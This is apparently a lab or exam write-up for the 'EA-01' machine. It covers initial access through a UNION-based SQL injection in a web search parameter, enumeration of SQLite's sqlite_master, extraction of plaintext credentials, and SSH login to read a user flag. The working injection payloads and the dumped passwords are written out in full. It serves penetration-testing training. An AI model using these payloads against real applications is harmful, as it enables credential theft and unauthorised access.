---
type: machine-phase
project: OSCP-Exam-PoC
machine: EA-01
difficulty: Easy
phase: initial-access
status: completed
initial_user: robert
initial_access: SQLite UNION-based SQL Injection
target: x.x.x.x
http_port: PORT_N
ssh_port: PORT_H
flag_path: /home/robert/user.txt
flag_submitted: true
tags:
  - oscp
  - ea-01
  - initial-access
  - sql-injection
  - sqlite
  - credential-disclosure
  - ssh
---

# EA-01 — User Foothold

> **Flag completion:** User flag obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Objective

The examination required:

> Start EA-01 from the Machines page, attack the assigned instance, gain user-level access, and submit the contents of `user.txt`.

The initial-access objective was completed successfully.

The attack chain used a SQL injection vulnerability in the web application's search functionality to retrieve credentials from its SQLite database. Those credentials were then used to authenticate over SSH.

## 2. Target Information

|Property|Value|
|---|---|
|Target IP|`x.x.x.x`|
|HTTP Port|`PORT_N`|
|SSH Port|`PORT_H`|
|Web Application|Search application|
|Search Parameter|`q`|
|Database Engine|SQLite|
|Initial Access Technique|UNION-based SQL injection|
|Identified Linux Account|`robert`|
|SSH Credential|`Falcon#Quarry7`|
|Target Hostname|`easy`|
|User Flag|`/home/robert/user.txt`|

### Provided Access Information

HTTP:

```
http://x.x.x.x:PORT_N
```

SSH:

```
ssh user@x.x.x.x -p PORT_H
```

The provided SSH username was `user`, but the actual credentials needed to access the machine were discovered through the web application's database.

## 3. Web Application Reconnaissance

### 3.1 Identify the Search Functionality

The web application displayed search results with two columns:

|Column|Displayed Value|
|---|---|
|First|Name|
|Second|Bio|

The search functionality accepted a query parameter named:

```
q
```

The initial observation was that the following URL displayed search results without entering a normal search term:

```
http://x.x.x.x:PORT_N/?q=%27--+
```

This suggested that the application might be vulnerable to SQL injection.

### 3.2 Establish the UNION Column Count

The visible application output contained two columns.

This established the initial requirement for a compatible UNION query:

```
SELECT column1, column2
```

The original query's output structure therefore provided a basis for constructing two-column UNION statements.

## 4. SQL Injection Exploitation

### 4.1 Initial MySQL/MariaDB Attempts

The first attempts assumed that the backend might be MySQL or MariaDB.

The first query attempted to enumerate tables in the current database:

```
' UNION SELECT table_name, table_schema
FROM information_schema.tables
WHERE table_schema = DATABASE()-- -
```

A second query attempted to enumerate tables across databases:

```
' UNION SELECT table_name, table_schema
FROM information_schema.tables-- -
```

Both attempts failed.

This was an important discovery: the backend did not behave as expected under MySQL-specific metadata enumeration.

### 4.2 Identify SQLite

The next approach used SQLite's internal schema catalog:

```
' UNION SELECT name, sql
FROM sqlite_master
WHERE type='table'-- -
```

This query succeeded.

Captured application output:

|Name|Bio|
|---|---|
|Alice Morgan|Front-end engineer, loves CSS.|
|Bader Khalil|Network team, CCNA.|
|Chen Wei|QA automation.|
|Dalia Nasser|Product designer.|
|members|`CREATE TABLE members ( id INTEGER PRIMARY KEY, name TEXT, bio TEXT )`|
|users|`CREATE TABLE users ( id INTEGER PRIMARY KEY, username TEXT, password TEXT`|

The returned schema identified two tables:

```
members
users
```

The `users` table was the relevant target.

Its schema exposed three fields:

```
id
username
password
```

**Finding:** The web application used SQLite, and its database catalog could be queried through the search parameter.

## 5. Credential Extraction

### 5.1 Enumerate the Users Table

Since the original application displayed two columns, the next query selected two fields from the `users` table:

```
' UNION SELECT username, password FROM users-- -
```

This returned the following records:

|Name|Bio|
|---|---|
|Alice Morgan|Front-end engineer, loves CSS.|
|Bader Khalil|Network team, CCNA.|
|Chen Wei|QA automation.|
|Dalia Nasser|Product designer.|
|admin|`b7e1...rotated...do-not-use`|
|robert|`Falcon#Quarry7`|

### 5.2 Analyze the Returned Credentials

Two credential records were identified.

|Username|Retrieved Password|Assessment|
|---|---|---|
|`admin`|`b7e1...rotated...do-not-use`|Explicitly marked as rotated and not to be used|
|`robert`|`Falcon#Quarry7`|Candidate credential|

The `admin` record contained an explicit warning:

```
rotated...do-not-use
```

The `robert` record contained an apparently usable password.

The selected candidate was therefore:

```
Username: robert
Password: Falcon#Quarry7
```

An important distinction was maintained: discovering an application database credential does not automatically establish that it is also a valid Linux or SSH credential.

That relationship still needed to be tested.

## 6. SSH Initial Access

### 6.1 Choose the Correct Environment

The SSH connection was performed from the Kali Linux terminal rather than Windows PowerShell.

This maintained consistency with the rest of the penetration-testing environment.

### 6.2 Authenticate as robert

Exact command:

```
ssh robert@x.x.x.x -p PORT_H
```

Password:

```
Falcon#Quarry7
```

The SSH authentication succeeded.

The resulting account was:

```
robert
```

Hostname:

```
easy
```

**Result:** Initial Linux access was established using the credential recovered from the SQLite database.

### 6.3 Verify User Access and Retrieve the Flag

From the SSH session:

```
cat user.txt
```

Captured output:

```
robert@easy:~$ cat user.txt
IT{FLAG-SECRET}
```

<badge color="success">User flag submitted successfully</badge>

The user-level objective was completed.

Flag:

```
IT{FLAG-SECRET}
```

## 7. Attack Chain Summary

```
HTTP Search Application
          |
          v
Identify q Parameter
          |
          v
Observe Two-Column Output
          |
          v
Test UNION SQL Injection
          |
          v
MySQL Enumeration Fails
          |
          v
Switch to SQLite
          |
          v
Query sqlite_master
          |
          v
Identify users Table
          |
          v
Extract username and password
          |
          v
Identify robert Credential
          |
          v
SSH Authentication
          |
          v
Access as robert
          |
          v
Read user.txt
          |
          v
Submit User Flag
```

## 8. Technical Findings

|Finding ID|Finding|Evidence|Result|
|---|---|---|---|
|EA-01-U01|Search parameter exposed to SQL syntax|`q` parameter|SQL injection suspected|
|EA-01-U02|Two-column output|Name and Bio fields|UNION column count identified|
|EA-01-U03|MySQL enumeration incompatible|`information_schema` queries failed|Database engine assumption rejected|
|EA-01-U04|SQLite backend|Query against `sqlite_master` succeeded|SQLite confirmed|
|EA-01-U05|Sensitive database table exposed|`users` table schema|Credential table identified|
|EA-01-U06|Credential disclosure|UNION query against `users`|Credentials recovered|
|EA-01-U07|SSH credential reuse|SSH as `robert` succeeded|Initial access|
|EA-01-U08|User flag retrieval|`cat user.txt`|User objective completed|

## 9. Difficulties and Decisions

### 9.1 Database Engine Assumption

**Problem:** The initial enumeration used MySQL/MariaDB metadata tables.

**Observation:** Both `information_schema` queries failed.

**Decision:** Switch to database-specific enumeration using SQLite's `sqlite_master`.

**Lesson:** Database-engine identification should be established through evidence rather than assumed from the application's behavior.

### 9.2 Two-Column UNION Requirement

**Problem:** The application's visible output exposed only two fields.

**Observation:** The search results contained Name and Bio.

**Decision:** Use two-column UNION statements.

**Lesson:** The number and types of columns in the original query constrain the structure of UNION-based SQL injection.

### 9.3 Choosing Between admin and robert

**Problem:** Two credential records were discovered.

**Observation:** The admin credential was marked as rotated and not to be used.

**Decision:** Select `robert` as the first SSH authentication candidate.

**Lesson:** Credential metadata and contextual hints matter. Do not treat every returned database row as an equally valid authentication candidate.

### 9.4 Application Credentials vs. SSH Credentials

**Problem:** Database credentials do not necessarily correspond to Linux accounts.

**Decision:** Test the recovered `robert` credential against the explicitly exposed SSH service.

**Result:** Authentication succeeded.

**Lesson:** Credential reuse must be validated against the relevant service.

## 10. Lessons Learned

1. **Start with the application's visible query structure.** The two displayed columns established the initial UNION requirement.
    
2. **Do not persist with the wrong database syntax.** The failed MySQL queries justified switching to SQLite-specific enumeration.
    
3. **SQLite exposes useful schema metadata through** `**sqlite_master**`**.** This allowed table discovery and schema inspection.
    
4. **Target relevant tables rather than dumping the entire database without a reason.** The `users` table was identified from its schema and then queried directly.
    
5. **Treat recovered credentials as candidates until authentication succeeds.** The successful SSH connection confirmed that the `robert` credential was reusable.
    
6. **Keep initial access and privilege escalation separate.** This phase ended once the user flag was submitted. SUID enumeration and root exploitation belong in [[Difficulty Levels/Easy/EA-01/root]].
    

## 11. Evidence Register

|Evidence ID|Description|Status|
|---|---|---|
|EA-01-U01|Initial HTTP endpoint|Recorded|
|EA-01-U02|Initial SQL injection observation|Recorded|
|EA-01-U03|Two-column output requirement|Recorded|
|EA-01-U04|Failed MySQL enumeration queries|Recorded|
|EA-01-U05|Successful SQLite schema query|Recorded|
|EA-01-U06|`members` and `users` table definitions|Recorded|
|EA-01-U07|Extracted credential records|Recorded|
|EA-01-U08|SSH command as `robert`|Recorded|
|EA-01-U09|Successful SSH authentication|Confirmed by user|
|EA-01-U10|User flag output|Recorded|
|EA-01-U11|User flag submission|Confirmed by user|

## 12. Related Documentation

- [[EA-01 Overview]]
    
- [[Difficulty Levels/Easy/EA-01/root]]
    
- [[Methodology/Web Enumeration]]
    
- [[Methodology/Initial Access]]
    
- [[Methodology/Evidence Collection]]
    

## 13. Completion Checklist

- Target services identified
    
- Search parameter investigated
    
- Two-column UNION requirement established
    
- MySQL enumeration attempts recorded
    
- SQLite backend identified
    
- Database tables enumerated
    
- `users` table identified
    
- Credentials extracted
    
- SSH credential selected
    
- SSH access as `robert` established
    
- User flag retrieved
    
- User flag submitted successfully
    
- Original HTTP requests and responses attached as evidence
    
- Screenshots of the SQL injection results attached
    

**Phase result:** User-level access and flag submission completed. The next phase is [[Difficulty Levels/Easy/EA-01/root]], documenting Linux enumeration and SUID-based privilege escalation through `/usr/bin/find`.